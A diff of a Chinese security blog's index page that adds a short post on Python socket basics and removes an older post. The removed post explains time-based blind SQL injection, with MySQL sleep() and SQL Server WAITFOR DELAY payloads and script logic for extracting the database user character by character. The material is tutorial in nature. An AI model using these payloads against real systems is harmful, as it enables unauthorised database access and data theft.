@@ -194,6 +194,87 @@
           
           
             
+              <a class="post-title-link" href="/2015/11/26/socket编程学习记录/" itemprop="url">
+                socket编程学习记录
+              </a>
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2015-11-26T14:39:45+08:00" content="2015-11-26">
+            2015-11-26
+          </time>
+        </span>
+
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/11/26/socket编程学习记录/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/11/26/socket编程学习记录/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody"><p>之前验证xml实体攻击漏洞的时候用到了python的socket模块当时没有记录下来，今天又要翻半天文档才弄明白其中的用法，在这里记录下来</p>
+<p>python提供了socket和socketserver两个基本模块，在这里主要记录下socket模块的用法</p>
+<h2 id="服务端代码">服务端代码</h2><pre><code>s = socket.<span class="function"><span class="title">socket</span><span class="params">(socket.AF_INET,socket.SOCK_STREAM)</span></span> #创建套接字号s，<span class="keyword">for</span> TCP
+可以在python解释器中通过dir（s）查看支持哪些方法
+s.<span class="function"><span class="title">bind</span><span class="params">((host,port)</span></span>)                                    #bind中的参数是元组类型
+s.<span class="function"><span class="title">listen</span><span class="params">(<span class="number">1</span>)</span></span>                                         #服务器允许的socket连接数，<span class="number">0</span>-<span class="number">5</span>
+conn,addr = s.<span class="function"><span class="title">accept</span><span class="params">()</span></span>                                 #这一步写进循环中
+#当客户端调用s.<span class="function"><span class="title">connect</span><span class="params">()</span></span>进行TCP连接（发生三次握手过程）
+s<span class="class">.recv</span>,s.<span class="function"><span class="title">sendall</span><span class="params">()</span></span>
+s.close
+</code></pre><h2 id="客户端代码">客户端代码</h2><pre><code><span class="keyword">s</span> = <span class="keyword">socket</span>.<span class="keyword">socket</span>(<span class="keyword">socket</span>.AF_INET,<span class="keyword">socket</span>.SOCK_STREAM) <span class="comment">#创建套接字号s，for TCP</span>
+<span class="keyword">s</span>.<span class="keyword">connect</span>((host,port))
+<span class="keyword">s</span>.<span class="keyword">close</span>
+</code></pre></span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
               <a class="post-title-link" href="/2015/11/20/VPS使用记录-APACHE-PHP-MYSQL环境搭建/" itemprop="url">
                 VPS使用记录-APACHE+PHP+MYSQL环境搭建
               </a>
@@ -1115,90 +1196,6 @@ sContent = urllib2.urlopen(<span class="string">"http://www.aokang.cn/member/ver
 
 
     
-      
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      
-      
-        <h1 class="post-title" itemprop="name headline">
-          
-          
-            
-              <a class="post-title-link" href="/2015/09/18/SQL注入练级攻略8-延时sql注入脚本/" itemprop="url">
-                SQL注入练级攻略8-延时sql注入脚本
-              </a>
-            
-          
-        </h1>
-      
-
-      <div class="post-meta">
-        <span class="post-time">
-          发表于
-          <time itemprop="dateCreated" datetime="2015-09-18T16:07:54+08:00" content="2015-09-18">
-            2015-09-18
-          </time>
-        </span>
-
-        
-
-        
-          
-            <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/2015/09/18/SQL注入练级攻略8-延时sql注入脚本/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/09/18/SQL注入练级攻略8-延时sql注入脚本/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-          
-        
-      </div>
-    </header>
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody"><p>昨天找到个延时注入,sqlmap跑出来数据库类型,试了下sqlmap生成payload好使,就自己动手写一个脚本验证一下.<br>记录下实现过程:</p>
-<h2 id="实现逻辑">实现逻辑</h2><pre><code><span class="keyword">try</span>:
-    发送payload
-    payload = <span class="string">"aaa';sleep(10)"</span>
-    conn = httplib.<span class="type">HTTPConnection</span>(host,timeout = <span class="number">5</span>);
-    conn.request(<span class="keyword">method</span>=<span class="string">"POST"</span>,url=<span class="string">"目标"</span>,body=payload,headers=headers);
-    conn.getresponse()
-    conn.close()
-expect:
-    如果发现异常说明当前payload判断正确
-</code></pre><h2 id="MYSQL相关函数">MYSQL相关函数</h2><p>在mysql中注入payload可能是这样的</p>
-<pre><code>aaa,;<span class="keyword">if</span><span class="params">(ascii<span class="params">(mid<span class="params">(lower<span class="params">(user<span class="params">()</span>)</span>,<span class="number">1</span>,<span class="number">1</span>)</span>,sleep<span class="params">(<span class="number">8</span>)</span>,<span class="number">0</span>)</span>)</span>=<span class="number">97</span>
-</code></pre><p>说明:<br>1.当前用户(user)小写(lower)第一个字母(mid)的ascii码(ascii)等于97时延时(sleep)8秒.<br>2.mid(p1,p2,p3) p1为字符串,p2为起始位置,p3长度<br>3.在python中可以使用ord(“s”)来对应小写字母s的ascii码</p>
-<h2 id="SQLSERVER相关函数">SQLSERVER相关函数</h2><p>在sqlserver中payload可能是这样的</p>
-<pre><code>username=aa';if(ascii(substring(system_user,%d,1))=%d) <span class="operator"><span class="keyword">begin</span> WAITFOR DELAY <span class="string">'0:0:10'</span> <span class="keyword">end</span><span class="comment">--" % (i,ord(s))</span></span>
-</code></pre><p>说明:<br>1.当前用户(system_user)第i个字母(substring)的ascii码(ascii)等于小写字母s对应的ascii码(ord)时,延时(WAITFOR DELAY)10秒.<br>2.substring(p1,p2,p3) p1为字符串,p2为起始位置,p3长度,和mysql中的mid函数功能类似<br>3.ord是python内建函数,其他的函数是在目标数据库中执行的.</p>
-</span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1237,7 +1234,7 @@ expect:
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">44</span>
+              <span class="site-state-item-count">45</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -1251,7 +1248,7 @@ expect:
 
           <div class="site-state-item site-state-tags">
             <a href="/tags">
-              <span class="site-state-item-count">36</span>
+              <span class="site-state-item-count">37</span>
               <span class="site-state-item-name">标签</span>
               </a>
           </div>
@@ -1314,7 +1311,7 @@ expect:
       <div class="footer-inner"> <div class="copyright" >
   
   &copy; &nbsp; 
-  <span itemprop="copyrightYear">2015</span>
+  <span itemprop="copyrightYear">2016</span>
   <span class="with-love">
     <i class="icon-next-heart"></i>
   </span>
